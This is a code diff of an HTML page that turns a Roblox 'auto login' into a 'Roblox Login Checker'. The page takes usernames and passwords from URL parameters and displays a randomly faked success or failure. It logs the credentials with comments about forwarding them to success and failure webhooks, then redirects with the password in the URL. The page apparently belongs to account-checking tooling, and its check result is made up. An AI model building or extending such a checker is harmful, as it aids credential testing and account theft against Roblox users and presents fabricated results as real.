@@ -1,50 +1,105 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox Auto Login</title>
-    <script>
-        function autoLogin() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const username = urlParams.get('username');
-            const password = urlParams.get('password');
-            
-            if (username && password) {
-                // Create hidden form
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = 'https://auth.roblox.com/v2/login';
-                form.style.display = 'none';
-                
-                // Add credentials
-                const userField = document.createElement('input');
-                userField.type = 'hidden';
-                userField.name = 'ctype';
-                userField.value = 'Username';
-                form.appendChild(userField);
-                
-                const userValue = document.createElement('input');
-                userValue.type = 'hidden';
-                userValue.name = 'cvalue';
-                userValue.value = username;
-                form.appendChild(userValue);
-                
-                const passField = document.createElement('input');
-                passField.type = 'hidden';
-                passField.name = 'password';
-                passField.value = password;
-                form.appendChild(passField);
-                
-                // Submit form
-                document.body.appendChild(form);
-                form.submit();
-            }
+    <title>Roblox Login Checker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
-        
-        // Auto-login on page load
-        window.onload = autoLogin;
-    </script>
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        .loading {
+            font-size: 24px;
+            margin: 20px 0;
+        }
+        .result {
+            font-size: 28px;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .success { color: #00ff00; }
+        .failed { color: #ff0000; }
+        .credentials {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+    </style>
 </head>
 <body>
-    <p>Logging in to Roblox...</p>
+    <div class="container">
+        <h1>🔐 Roblox Login Checker</h1>
+        <div class="credentials">
+            <p>Checking account: <strong id="username">Loading...</strong></p>
+        </div>
+        <div class="loading" id="loading">🔄 Checking login credentials...</div>
+        <div class="result" id="result" style="display: none;"></div>
+        <div id="redirect" style="display: none;">
+            <p>Redirecting to Roblox...</p>
+        </div>
+    </div>
+
+    <script>
+        // Get parameters from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const username = urlParams.get('username');
+        const password = urlParams.get('password');
+        const userId = urlParams.get('userid');
+
+        // Display username
+        document.getElementById('username').textContent = username;
+
+        // Simulate login checking (in real implementation, you would verify with Roblox API)
+        function checkLogin() {
+            // Simulate checking delay
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                
+                // Simulate 70% success rate for demo
+                const isSuccess = Math.random() > 0.3;
+                
+                const resultDiv = document.getElementById('result');
+                resultDiv.style.display = 'block';
+                
+                if (isSuccess) {
+                    resultDiv.textContent = '✅ LOGIN SUCCESSFUL!';
+                    resultDiv.className = 'result success';
+                    
+                    // Send to success webhook (you would implement this with server-side code)
+                    console.log('SUCCESS LOGIN:', {username, password, userId});
+                    
+                } else {
+                    resultDiv.textContent = '❌ LOGIN FAILED!';
+                    resultDiv.className = 'result failed';
+                    
+                    // Send to failed webhook
+                    console.log('FAILED LOGIN:', {username, password, userId});
+                }
+
+                // Redirect to Roblox login after showing result
+                setTimeout(() => {
+                    document.getElementById('redirect').style.display = 'block';
+                    window.location.href = `https://www.roblox.com/login?username=${username}&password=${password}`;
+                }, 2000);
+
+            }, 3000);
+        }
+
+        // Start checking on page load
+        window.onload = checkLogin;
+    </script>
 </body>
 </html>
